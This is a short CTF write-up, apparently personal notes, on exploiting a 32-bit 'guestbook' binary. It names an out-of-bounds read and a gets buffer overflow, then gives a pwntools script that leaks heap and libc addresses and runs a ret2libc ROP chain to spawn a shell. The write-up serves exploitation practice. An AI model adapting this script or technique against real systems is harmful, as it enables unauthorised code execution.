- `checks`
  ![[tu_guestbook_nightmare-1.png]]
- decompile:
  ![[tu_guestbook_nightmare-2.png]]
  ![[tu_guestbook_nightmare-3.png]]
  ![[tu_guestbook_nightmare-4.png]]
- NX on, no canary, `system`, 32bit -> [[ret2libc]] + [[ROP]]
- there are 2 bugs here: 
	- one in view name, no restriction in checking idx -> out-of-bounds
	- other in change name, `gets` has no limit -> bof
- **step 1: leak libc**
- check offset = 6, it leaks some data
  ![[tu_guestbook_nightmare-5.png]]
- check stack, they r heap addr + system addr
  ![[tu_guestbook_nightmare-6.png]]
  ![[tu_guestbook_nightmare-7.png]]
- therefore we got heap + libc addr
- **step 2: ROP**
  ![[tu_guestbook_nightmare-8.png]]
- `strcpy` in 32bit
  ```
	push src
	push dest
	call strcpy
  ```
- so eax = dest, src = content
- to bypass these 2 instructions, we must set ebp-0x34 = 0 (to get dest at ebp-0x2c) and ebp=0x2c = an available addr = heap leak
- find offset 
  ![[tu_guestbook_nightmare-9.png]]
- payload:
  ```python
	p.sendlineafter(b'>>>', b'A'*4)
	p.sendlineafter(b'>>>', b'B'*4)
	p.sendlineafter(b'>>>', b'C'*4)
	p.sendlineafter(b'>>>', b'D'*4)
	# leak heap + libc base
	p.sendlineafter(b'>>', b'1')
	p.sendlineafter(b'>>>', b'6')
	leak = p.recv(24)
	libc_leak = u32(leak[20:24])
	heap_leak = u32(leak[:4])
	libc.address = libc_leak - 0x3ada0
	log.info(f'heap leak: {hex(heap_leak)}')
	log.info(f'libc leak: {hex(libc_leak)}')
	log.info(f'libc base: {hex(libc.address)}')
	#rop
	bin_sh = libc.address + 0x15ba0b
	system = libc_leak
	p.sendlineafter(b'>>', b'2')
	p.sendlineafter(b'>>>', b'0')
	rop = b'A'*0x64 + p64(0x0) + p32(heap_leak) + b'B'*44 + p32(system) + b'C'*4 + p64(bin_sh)
	p.sendlineafter(b'>>>', rop)
	p.sendline(b'')
	p.sendlineafter(b'>>', b'3')
  ```